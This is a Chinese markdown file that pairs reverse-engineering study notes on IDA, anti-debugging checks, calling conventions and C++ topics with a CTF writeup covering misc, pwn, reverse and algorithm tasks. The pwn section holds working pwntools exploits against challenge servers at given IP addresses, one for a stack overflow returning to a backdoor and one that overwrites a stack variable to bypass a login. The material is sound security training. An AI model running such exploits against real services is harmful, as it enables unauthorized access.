# 逆向

## IDA不能F5的可能问题

- 动态解密
- 栈指针错误
- junkcode，未能正确识别代码和数据
- call调用错误,未能成功解析参数位置和个数
- F5会自动删除其认为不可能到达的死代码，比如异常代码

## switch case的实现方式

- case的值相差较小可以直接用类似数组下标的跳转表实现
- 相差过大又没有规律可能会采用二分查找



## 交叉引用显示没有结果，可能原因

- 加花

- smc      

  上述原因：函数就不能create function，



## 特殊编译器r8寄存器传参，如何让F5生效

更改IDA函数调用方式



## 反调试

### Linux

[link0](https://blog.csdn.net/earbao/article/details/53933238)

#### ptrace自身进程

在同一时间，进程最多只能被一个调试器进行调试

于是我们可以通过调试进程自身来判断是否已经有其他调试器存在

#### 检查父进程名称

通常我们使用gdb调试时，是通过`gdb <TARGET>`，而这种方式是启动gdb，fork出子进程后执行目标二进制文件

因此二进制文件的父进程即为调试器，可以检查父进程名称来判断是否是由调试器fork

#### alarm

设置程序最大运行时间

#### 检查进程运行状态

使用gdb attach到目标进程进行调试后,被调试进程的父进程便不是调试器了,检查/proc/self/status文件,进程状态由sleeping变为tracing stop，TracerPid也由0变为非0的数，即调试器的PID



### Windows

[link1](https://www.52pojie.cn/forum.php?mod=viewthread&tid=271854&page=1&&tdsourcetag=s_pcqq_aiomsg)

[link2](https://www.cnblogs.com/blueprincess/p/3655626.html)

#### Windows API

`IsDebuggerPresent`，`CheckRemoteDebuggerPresent`，`NtQueryInformationProcess`

第一个修改返回结果

第二个改变第二个参数(判断是否再调试)

第三个修改第二个参数（进程信息）

#### 手动检测数据

##### 查询进程PEB(进程环境块)的BeingDebugger(偏移0x2)标志位

进程被调试器所附加时，操作系统会自动设置这个标志位

##### 查询进程PEB(fs:[0x30])的NtGlobal(偏移0x68)标志位

由于调试器中启动进程与正常模式下启动进程有些不同，所以它们创建内存堆的方式也不同，系统使用PEB结构偏移量0x68处的一个未公开位置，来决定如何创建堆结构。如果这个位置的值为0x70，我们就知道进程正运行在调试器中。

##### 触发异常

首先进程使用`SetUnhandledExceptionFilter`函数注册一个未处理异常处理函数A，如果进程没有被调试的话，那么触发一个未处理异常，会导致操作系统将控制权交给之前注册的函数A；如果进程被调试的话，那么这个未处理异常会被调试器捕捉，原先的A函数就没有机会执行了

##### 调用DeleteFiber函数

如果给DeleteFiber函数传递一个无效参数的话，它除了会抛出一个异常意外，还会将进程的`LastError`值设置为具体出错原因的代号

但是，如果进程正在被调试，`LastError`值会被修改，因此如果调试器绕过了上面的异常，还可以验证`LastError`值是否被修改来检测调试器





### OD为什么可以绕过反调试







### 如何对抗OD的反反调试







### 通用绕过time检测的方法







## ollvm的原理





### 如何去掉控制流平坦化









## 静态链接的程序，符号没了，如何解决









## 除法优化





## 一个程序是虚拟机解释器，有什么好方法







## pyc文件逆向

### 换掉opcode以后？



### 换掉的opcode已经有了，如何换回去









## windows上C语言调用约定

> 谁来开辟栈空间

**IDA实际调试，C++类**

- `cdecl`，函数外平栈，例如`printf`

  栈空间的变化

```assembly
push 1
push 2
call function
add esp,8
```

- `stdcall`，函数内平栈
- `fastcall`，和`stdcall`类似（存疑）
  1. 函数的第一个和第二个DWORD参数(或者更小的)，通过`ecx`和`edx`传递，其他参数从右往左压栈
  2. 函数内平栈
  3. 函数名修改规则同`stdcall`
- `thiscall`
  1. 是唯一一个不能明确指明的函数修饰，因为`thiscall`不是关键字，它是C++类成员函数缺省的调用约定，由于成员函数调用还有一个`this`指针，因此必须特殊处理
  2. 函数从右向左入栈
  3. 如果参数个数确定，`this`指针通过`ecx`传递给被调用者；如果参数个数不定，`this`指针在所有参数入栈后被压入堆栈
  4. 对于参数个数不定的，调用者清理堆栈；否则函数自身清理堆栈
  5. ！！！！！！！返回对象，和this的位置关系
- `naked call`



### WINAPI调用约定？

就是`__stdcall`   ？吗？



## linux上有区别吗？cdecl是怎么传的

> windows linux默认调用约定？
>
> gcc vc的默认
>
> ？
>
> 加密与解密看看





## 32位平台如何返回一个64位整数

### 返回一个结构体和类？





## windows上PEB(TEB)的概念

**TEB(Thread Environment Block)**和**PEB(Process Environment Block)**分别储存与**线程和进程**相关的内容

> TEB 线程环境信息块
>
> PEB 进程环境信息块

**TEB**结构一般位于`fs:[0]`的位置，**TEB**结构偏移`0x30`的位置给出了其对应的**PEB**地址

再看看**PEB**的结构，偏移`0x02`的位置有一个`BeingDebugged`的标志位，用于判断程序是否在被调试；此外在偏移`0x68`的`NtGlobalFlag`同样可以用于判断



> `PEB`的`0x18`处给了堆的地址，其中`0x0C`处的`HeapFlags`和`0x10`处的`ForceFlags`也可以用来检测调试
>
> `HeapFlags`的正常值为2
>
> `ForceFlags`的正常值为0



## 对称加密

### Feistel网络



### AES实际使用

难道就是明文传进来一块一块加密出去？





## 为什么hash难碰撞





## hash长度拓展





## MD5中输入翻转了一个bit，输出会怎么变





## linux延迟绑定机制



### 加载完地址就定下，如何实现？

不要延迟绑定的意思吧



### GOT不能写，为什么还能延迟绑定？





## stack canary

fs:0x28？

### fs是什么





## C语言结构体

### 字节对齐

char对齐为1，int为4，编译器默认最小对齐比如为4，那么就会占8个字节

但是编译器参数可以改，比如改成1，就是占5个字节

```C

struct{
    char c1;
    int a;
    char c2;
};	// sizeof == 12

struct{
    char c1;
    char c2;
    int a;
}	// sizeof == 8
```

编译器不会为了省内存而把前者的char c2提到int前



### 位域概念、作用

**位域(bit field)**，也叫**位段**，形如：

```C
struct data {
	char c : 5;
	int a : 24;
	unsigned char : 6;	//无名位域，占6位
};
```



举个例子，这样的结构体只占1字节

```C
struct data {
	char c1 : 4;
	char c2 : 4;
};	// sizeof == 1
```



也可以有意使某个位域从**下一单元**开始：

```C
struct data {
	char c1 : 4;
	char : 0;
	char c2 : 4;
};	// sizeof == 2
```

无名位域仅用于填充或调整位置，不能被访问





**一个位域必须存储在同一个单元中，不能跨两个单元，比如char c1:2; char c2:4**

```C
struct data {
	char c1 : 4;
	char c2 : 5;
	char c3 : 6;
};	// sizeof == 3
```



几个注意点：

- 不能对位域进行**取地址**操作
- 若位域的二进制位数为0，这个位域必须是无名位域，下一个位域从下一个存储单元开始存放
- 若位域出现在表达式中，则自动进行类型提升
- 对位域赋值最好不要超过它能表示的最大范围，可能会造成奇怪的结果

> 整个位域结构体的大小为其最宽基本类型成员大小的整数倍
>
> 这句话**不对**，vs中可以#pragma pack(1) 设置默认最小对齐数







## windows消息机制

一道逆向题：

发现`success`是消息参数0x40B的响应，若是找到发消息的源发地，估计算法就在附近了

先去IDA->import窗口找`SendMessage`但是没找到，接着还有`PostMessage`，找到了







## 如何在C语言main函数之前调用自定义初始化函数



### linux下elf这些函数存在哪里

load段？





## ELF文件最少要那些信息才能跑起来



## ELF:program table & section table

一个segment，一个section

这两个去掉哪个还是可以运行的






# C++

## 第三方库(boost)逆向障碍



## g++编译器：虚表初始化



## boost库静态链接，符号被抹除，如何识别常见函数、一些模板类



## 一个类继承2个虚基类：布局



## typeid

先了解一些`RTTI(Run-Time) Type Identification`运行时类型识别

它使程序能够获取由基类指针或引用所指向对象的实际派生类型，为了支持RTTI，C++提供了`dynamic_cast`和`typeid`

`typeid`是C++关键字之一，等同于`sizeof`这类的操作符

- 如果表达式的类型是**类类型**，并且包含虚函数，则typeid返回表达式的动态类型，需要运行时计算
- 否则，typeid返回表达式的静态类型，编译时就可以计算



`typeid(a).name()`，其中a是一个类，name()函数返回一个C-style字符串





## linux虚拟地址如何映射到物理地址



## NX原理：是 谁 设置页不可执行



## 右值引用

临时值：不具名的**纯右值**

> 区分左值和右值：能**取地址**则为左值，反之为右值

C++11中，所有值必属于**左值、将亡值、纯右值**之一

关键是**将亡值**，比如将要被移动的对象、T&&函数返回值、`std::move`返回值、转换为`T&&`的类型的转换函数的返回值等

`T&& k = getVar();`	表达式结束后，函数产生的临时值不会被销毁，而是被**续命**，它的生命周期将通过右值引用得以延续，和变量k的生命周期一样长

> 常量左值引用是一个**万能**的引用类型

注意，`const A& a = GetA();`必须加上`const`

而`A& a = GetA();`会报一个编译错误，因为**非常量左值引用只能接受左值**



右值引用类型的变量，有可能是左值也有可能是右值

`T&&`表示的值类型**不确定**，这就是一个特点

`T&& t`在发生自动类型推断时，它是**未定的引用类型(universal references)**



>  **移动构造函数**，将指针的**所有者**转移到了另一个对象，同时将原先的指针置为空

C++11 `std::move`可以**将左值转换为右值**，从而方便地应用移动语义，它将对象资源的所有权转移到另一个对象

使用`std::move`几乎没有是任何代价，将左值引用变成右值引用，然后应用**移动语义**，调用**移动构造函数**，避免拷贝



`std::forward`按照参数的**实际类型**转发

> 右值引用`T&&`是一个`universal references`，可以接受左值或者右值，正是这个特性让它适合作为一个**参数的路由**，然后通过`std::forward`按照参数的实际类型去匹配对应的重载函数，最终实现**完美转发**





## NULL和nullptr的区别

```C
#ifndef NULL
    #ifdef __cplusplus
        #define NULL 0
    #else
        #define NULL ((void *)0)
    #endif
#endif
```

NULL就是一个简单的0,但是如果函数要传一个指针，而我们却传入了int的版本，会导致错误

而传入`nullptr`即可，因为C++规定nullptr可以转换为指针类型，而且是`cv void*`



还有就是模板匹配的问题





## C++类 有没有static的区别

重学！！！





## C++引用和指针有什么区别



### 指针和引用传参时的区别





## 如何将左值引用转换为右值引用





## auto的作用



## lambda怎么写怎么用



## C++中强制类型转换的方法

### dynamic(static)_cast的区别





## C++的四种继承方法





## C++智能指针

### 这些指针使用起来会有什么问题



### 函数参数传一个shared_ptr的问题

资源泄露之外？更严重的问题？



## 为什么STL的快排比我手写的快

小规模，插入排序



## C程序：从源代码变成可执行程序的过程

就是编译过程有哪些步骤













# 操作系统相关

## linux看哪个端口被哪个进程占用









## linux和windows的系统调用约定



## windows的shellcode














# Writeup by ffdy
## Misc
#### HiddenImage
010 打开发现图片后面粘连了 zip 文件
zip 文件里有一个 getflag.jpg 文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831222716250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
Kali 使用 binwalk -e 分离出 getflag.jpg
同样使用 010 查看,发现文件末尾有一段 url 编码 ~~(应该是吧)~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831223643425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
复制到 Google 搜索框回车,得到 flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831223716531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
`flag: flag{h1d3_1m@g3_s0_3Asy}`
#### 问卷题
这个根据心情填就好了 ~~(手动滑稽)~~

## Pwn
#### babybabystack
简单的 ROP
checksec 检查发现:
32 位,开了 NX,不能直接执行栈上的数据
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831225607195.png)
用 IDA 反汇编
发现漏洞存在于 main 函数后的 vulnerable_function 函数中的 read 函数上
可以用来覆盖 ebp 控制执行的函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901082109863.png)

看到 _system() 函数
有个 back_door 函数调用

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831225844777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

back_door 函数直接包含 sh
得到 bin 地址

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831230108963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

回看 buf 的地址,以 ebp 为索引
无需调试,直接使用偏移量

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831230057302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
```python
from pwn import *


#p=process('./babybabystack')

p=remote('148.70.206.225',50001)

bin_addr=0x8048569

pay='a'*(0x1c+4)+p32(bin_addr)
p.sendline(pay)

p.interactive()
```
得到 flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/2019083123091338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

`flag: flag{5t4ck_0v3rF10w_15_u53fu1}`

#### string&float

checksec 检查
64 位,开了 NX 和 Canary,心里慌得一批

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831231416837.png)

上 IDA
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019083123245019.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
可以看出得到 flag 的条件是 login 函数返回 true
v4 等于 pai

首先来看 login 函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831232744883.png)
返回 verifykey 函数的返回值
verifykey 函数就是比较 v2 和 v3 是否相等
相等返回 1,不相等返回 0
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831233018573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
v2 的值可以通过 password 出的读入控制
但是 v3 是 generateKey 函数生成的随机数
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831233340170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
注意到还有一个 buf 读入
查看两者的地址发现可以通过 buf 改写 v3 的值
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831233712448.png)
通过向 buf[0x40-0x20] 处写入可以修改 v3 的值
即把 v2 和 v3 都改成 0
```python
buf=0x20
v2=0

p.recvuntil('name:\n')
p.sendline(p64(buf))

p.recvuntil('password:\n')
p.sendline(p64(v2))
```
绕过 login,然后是 v4 等于 pai 

(以下为个人理解,但感觉有些地方有点问题)

看到 int 类型 pai 的 float 强制转换,加上 v4 是 float 类型并且变量名是 pai
自然联想到圆周率,恰好 pai 转换出来的数是 3.1415... 
然后就信以为真,提交 3.1415...
然而是个小坑

v4 确实是 float 类型,但在输入的时候
scanf 函数的格式化字符指定的是 %ud (无符号整形)
v4 和 pai 都进行了强制转换
也就是说输入的数等于 pai 的整形就可以了
即直接提交 1078530000(0x40490FD0)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831235544453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

```python
from pwn import *
#p=process('./pwn1')
p=remote('188.131.218.201',10001)
buf=0x20
v2=0
p.recvuntil('name:\n')
p.sendline(p64(buf))
p.recvuntil('password:\n')
p.sendline(p64(v2))
p.recvuntil('pai?\n')
p.sendline('1078530000')
p.interactive()
```
得到 flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831235653284.png)
`flag: flag{C_sTr1ng__3nD_f10aT}`
## Re
#### maze
看着题面描述猜测是一道迷宫题
IDA 验证也确实是一道迷宫题
先看看反汇编代码

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901083325471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901083337368.png)

有一个 check 函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/2019090108392729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

以 map 数组为地图,v5 为 map 索引,v6 为输入的字符串索引
把 w s a d 定义为上下左右 ~~(突然想念 4399 )~~

如果 map[v5] 等于 * 或者 # 就退出
map[v5] 等于 & 并且 v6 等于 55 时正确

进一步由上下 +-50 推知 map 每行长为 50
输入长为 55

然后寻找地图

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901085400550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

导出后每行 50 整理得
```
****#*********************************************
****!!********************************************
*****!**!!!!************!!!!!*********************
*****!!!!**!************!***!*********************
***********!************!***!!!!!!!***************
***********!************!*********&***************
***********!!***********!*************************
************!!!!!*******!*************************
****************!!!*****!*************************
******************!*****!*************************
******************!!!!**!*************************
*********************!!!!*************************
**************************************************
**************************************************
**************************************************
```
回看了一下 v5,开始时被赋值为 4
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901085146373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
和地图完全吻合,感觉自己萌萌哒
然后得到 `sdssdddwdddssssdsddddsddssdddsdddwwwwwwwwwddddssdddddds`
自信满满提交一波,心中暗爽
然后 wrong 掉......

反复确认地图,没发现问题
只能上 edb 动态调试
还好流程比较简单,发现第 16,17 步的拐角出了问题
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901090632857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
我是真的不知道得到的地图为啥会有问题
菜到离世

得到正确的 flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901091141831.png)
`flag: flag{sdssdddwdddsssssdddddsddssdddsdddwwwwwwwwwddddssdddddds}`

#### Baby Protection
一道安卓逆向
去年是 RSA,今年是 DES
用 d2j-dex2jar 得到 jar 包
用 Java_Decompiler 打开阅读源码

没学过 Java,看不太懂,也不太懂术语

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901092324280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

check 函数返回 true 时正确
查看 check 函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901092627273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

如果输入不包含 flag,返回 false

将 enc1,2,3 拼接在 localObject 中
str 经过 base64 加密

将输入和 str 传入 CryptoUtil 类中的 encode 函数
加密后的返回值与 localObject 比较,相等返回 true,否则 false


然后进入 CryptoUtil.encode 查看

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901094547620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

代码确实看不懂,但有明确的 DES 字符提示
猜测为 DES 加密
str 应该就是密匙,localObject 为密文
github 上找了个 DES 脚本

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901094948716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

一开始不知道密匙是 8 位,解出来的 flag,有点问题
真正的密匙应该是 str base64 加密后的前 8 位

得到 flag

`flag: flag{E4Sy_De5_4nDr01d_pR0teCt!}`


## PPC
#### 四暗刻单骑
模拟
开一个数组记录相应的牌的数量
当且仅当有 5 种牌,除其中一种为一张,其余 4 种大于一张
输出只有一张的那一种牌
```cpp
#include<cstdio>
#include<cstring>
#include<algorithm>
using namespace std;
char str[10];
int card[110];
int main(){
	for(int i=1;i<=13;i++){//记录每种牌的数量
		scanf("%s",str);
		if(str[1]=='m'){
			card[str[0]-'0']++;
		}
		if(str[1]=='s'){
			card[str[0]-'0'+9]++;
		}
		if(str[1]=='p'){
			card[str[0]-'0'+18]++;
		}
		if(str[1]=='z'){
			card[str[0]-'0'+27]++;
		}
	}
	int ans=0,bns=0;
	for(int i=1;i<=34;i++){
		if(card[i])ans++;//记录一共有几种牌
	}
	if(ans>5||ans<5){
		printf("No Solution\n");
		return 0;
	}
	for(int i=1;i<=34;i++){
		if(card[i]==1)bns=i;//记录只有一张的牌的种类
	}
	if(bns){
		if(bns<10)printf("%dm\n",bns);
		else if(bns<19)printf("%ds\n",bns-9);
		else if(bns<28)printf("%dp\n",bns-18);
		else printf("%dz\n",bns-27);
	}
	else printf("No Solution\n");
	return 0;
}
```
#### 死锁
看完题发现就是有向图求环
有 DFS 和 拓扑排序两种解法
但数据规模比较小,DFS 就好了 ~~(绝对不是写不出拓扑)~~
算是模板题
```cpp
#include<cstdio>
#include<cstring>
#include<algorithm>
using namespace std;
const int maxn=1100;
int n,m;
bool map[maxn][maxn];
int used[maxn];
void dfs(int a){
	used[a]=1;//打上标记
	for(int i=0;i<n;i++){
		if(map[a][i]==true){
			if(used[i]==true){//已经标记过说明形成了环
				printf("Y\n");
				exit(0);
			}
			else if(used[i]==-1) continue;//访问过的直接跳过
			else dfs(i);
		}
	}
	used[a]=-1;//标记为访问过
}
int main(){
	int a;
	scanf("%d",&n);
	for(int i=0;i<n;i++){
		scanf("%d",&m);
		for(int j=1;j<=m;j++){
			scanf("%d",&a);//邻接矩阵建图
			map[a][i]=true;
		}
	}
	for(int i=0;i<n;i++){
		if(used[i]==-1) continue;//访问过就跳过
		else dfs(i);
	}
	printf("N\n");
	return 0;
}
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTcxNDM0NjA5NSwtMTkwNDI3MTE4OF19
-->